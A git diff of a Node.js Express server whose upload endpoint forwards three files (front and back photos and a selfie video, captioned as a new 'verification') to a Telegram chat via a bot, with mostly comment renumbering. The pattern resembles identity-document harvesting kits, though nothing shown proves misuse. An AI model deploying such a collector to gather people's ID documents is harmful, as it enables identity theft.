@@ -9,16 +9,13 @@ const path = require('path');
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-if (!BOT_TOKEN || !CHAT_ID) {
-    console.error("Error: Las variables TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID deben estar definidas en el entorno del servidor.");
-    // No salimos del proceso para que los logs de Render muestren el error
-    // process.exit(1); 
-}
-
 // --- URLs de la API de Telegram ---
-const TELEGRAM_API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
-const SEND_PHOTO_URL = `${TELEGRAM_API_BASE}/sendPhoto`;
-const SEND_VIDEO_URL = `${TELEGRAM_API_BASE}/sendVideo`;
+// Mover la lógica de construcción de URL dentro del 'try'
+// para que el servidor inicie incluso si las variables de entorno 
+// aún no están configuradas (pero fallará en la solicitud).
+const TELEGRAM_API_BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const SEND_PHOTO_URL = `${TELEGRAM_API_BASE_URL}/sendPhoto`;
+const SEND_VIDEO_URL = `${TELEGRAM_API_BASE_URL}/sendVideo`;
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -34,7 +31,7 @@ const upload = multer({
 // Sirve todo lo que esté dentro de la carpeta 'public'
 app.use(express.static(path.join(__dirname, 'public')));
 
-// --- El Endpoint de Subida (Actualizado) ---
+// --- El Endpoint de Subida ---
 app.post(
     '/api/enviar-a-telegram', 
     // Espera 3 campos de archivo específicos
@@ -53,7 +50,7 @@ app.post(
             return res.status(400).send({ error: 'Faltan archivos (se esperan 3).' });
         }
         
-        // Validar que las variables de entorno estén cargadas
+        // 2. Validar que las variables de entorno estén cargadas
         if (!BOT_TOKEN || !CHAT_ID) {
              console.error("Error 500: Las variables de Telegram no están configuradas en el servidor.");
              return res.status(500).send({ error: 'Error de configuración interna del servidor.' });
@@ -67,7 +64,7 @@ app.post(
 
             const caption = `Nueva verificación recibida.`;
 
-            // 2. Enviar Foto Frontal
+            // 3. Enviar Foto Frontal
             console.log("Enviando foto frontal...");
             const formFront = new FormData();
             formFront.append('chat_id', CHAT_ID);
@@ -78,7 +75,7 @@ app.post(
                 headers: formFront.getHeaders()
             });
 
-            // 3. Enviar Foto Trasera
+            // 4. Enviar Foto Trasera
             console.log("Enviando foto trasera...");
             const formBack = new FormData();
             formBack.append('chat_id', CHAT_ID);
@@ -89,7 +86,7 @@ app.post(
                 headers: formBack.getHeaders()
             });
 
-            // 4. Enviar Video Selfie
+            // 5. Enviar Video Selfie
             console.log("Enviando video selfie...");
             const formVideo = new FormData();
             formVideo.append('chat_id', CHAT_ID);
@@ -102,7 +99,7 @@ app.post(
 
             console.log("¡Todos los archivos enviados a Telegram con éxito!");
 
-            // 5. Responder al frontend con éxito
+            // 6. Responder al frontend con éxito
             res.status(200).send({ success: true, message: 'Archivos enviados.' });
 
         } catch (error) {
@@ -112,7 +109,7 @@ app.post(
     }
 );
 
-// Ruta principal para servir el index.html (opcional pero recomendado)
+// Ruta principal para servir el index.html
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
